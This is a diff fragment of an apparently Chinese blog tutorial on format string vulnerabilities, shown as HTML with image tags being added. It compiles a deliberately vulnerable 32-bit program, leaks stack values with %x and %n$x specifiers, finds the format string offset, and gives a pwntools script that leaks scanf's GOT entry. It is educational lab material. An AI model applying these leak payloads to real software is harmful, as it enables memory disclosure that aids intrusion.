 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gcc -m32 -fno-stack-protector -no-pie -o leakmemroy leakmemory.c</span></span><br></pre></td></tr></table></figure>
 
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905170410147.png" class="" title="image-20240905170410147">
 
 <p>可以看出，编译器给了警告信息，说程序中没有给出格式化字符串的参数。接下来看一下如何获取对应的栈内存。根据C语言的调用规则，格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为其参数（64位会根据其传参的规则进行获取）。这里主要介绍32位。</p>
 <p><strong>获取栈变量数值</strong></p>
 <p>首先，可以利用格式化字符串来获取栈上变量的数值。运行结果如下：</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905181033717.png" class="" title="image-20240905181033717">
 
 <p>可以看到，确实得到了一些内容。为了更加细致的观察，利用GDB调试一下，验证猜想。</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905180755822.png" class="" title="image-20240905180755822">
 
 <p>启动程序后，断点下在printf函数处</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905180851048.png" class="" title="image-20240905180851048">
 
 <p>输入<code>%08x.%08x.%08x</code></p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905181606245.png" class="" title="image-20240905181606245">
 
 <p>停在了第一次调用printf函数的位置。此时进入了printf函数中，栈中的第一个变量为返回地址，第二个变量为格式化字符串的地址，第三个变量为a的值，第四个变量为b的值，第五个变量为c的值，第六个变量为我们输入的格式化字符串对应的地址。继续运行程序</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905182041024.png" class="" title="image-20240905182041024">
 
 <p>程序的确输出了每一个变量对应的数值，并且断在了下一个printf处</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905182237830.png" class="" title="image-20240905182237830">
 
 <p>此时，由于格式化字符串为%x%x%x,所以，程序会将栈上的<code>0xffffd070</code>及其之后的数值分别以第一，第二，第三个参数按照int类型进行解析，分别输出。继续运行，查看结果。</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905183316461.png" class="" title="image-20240905183316461">
 
 <p>确实会将栈顶的内存数据以预定的形式输出出来。</p>
 <p>但是需要注意的是，并不是每次得到的结果都一样，因为栈上的数据会应为每次分配的内存页不同而有所不同，这是因为栈不是对内存页做初始化的。</p>
@@ -1044,10 +1044,10 @@
 
 <p>利用如下字符串，可以获取到对应的第n+1个参数的数值。为什么是第n+1个参数？因为格式化参数里面的n指的是该格式化字符串对应的第n个输出参数，那相对于输出函数来说，就是第n+1个参数。</p>
 <p>再次以gdb调试一下。</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905184015890.png" class="" title="image-20240905184015890">
 
 <p>输入换成<code>%3$x</code></p>
-<p><strong></strong></p>
+<p><strong><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905184142961.png" class="" title="image-20240905184142961"></strong></p>
 <p>可以看到，获得了printf的第四个参数所对应的值.</p>
 <p><strong>获取栈变量对应字符串</strong></p>
 <p>此外，我们还可以获得栈变量对应的字符串，需要用到%s</p>
@@ -1069,17 +1069,17 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[tag]%p%p%p%p...</span><br></pre></td></tr></table></figure>
 
 <p>一般来说，重复某个字符的机器字长来作为tag，而后面会跟上若干个%p来输出栈上的内容，如果内容与前面的tag重复了，那么就有很大把握说明该地址就是格式化字符串的地址，之所以说很大把我，这是因为不排除栈上有一些临时变量也是该数值。一般情况下，极其少见，可以更换其他字符进行尝试，进行再次确认。这里利用字符’A’作为tag，程序依然是先前的示例程序。</p>
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905192046910.png" class="" title="image-20240905192046910">
 
-
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905192400233.png" class="" title="image-20240905192400233">
 
 <p>由41414141处所在的位置可以看出格式化字符串的起始地址正好是输出函数的第5个参数，那么它是格式化字符串的第4个参数。可以测试一下</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905192511692.png" class="" title="image-20240905192511692">
 
 <p>程序崩溃了，因为试图将该格式化字符串所对应的值作为地址进行解析(这是%s的作用)，但是显然该值无法作为一个合法的地址被解析，所以崩溃了。</p>
 <p>这是因为变量值不能够该程序访问，所以程序自然崩溃。如果设置一个可访问的地址呢？比如果scanf@got，结果会怎么样呢？应该自然是输出scanf对应的地址。</p>
 <p>首先，获取scanf@got的地址，如下</p>
-
+<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905192920308.png" class="" title="image-20240905192920308">
 
 <p>利用pwntools构造payload如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./leakmemory&#x27;</span>)</span><br><span class="line">leakmemory = ELF(<span class="string">&#x27;./leakmemory&#x27;</span>)</span><br><span class="line">__isoc99_scanf_got = leakmemory.got[<span class="string">&#x27;__isoc99_scanf@GLIBC_2.7&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(__isoc99_scanf_got))</span><br><span class="line">payload = p32(__isoc99_scanf_got) + <span class="string">&#x27;%4$s&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;%4$s\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(u32(sh.recv()[<span class="number">4</span>:<span class="number">8</span>])))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
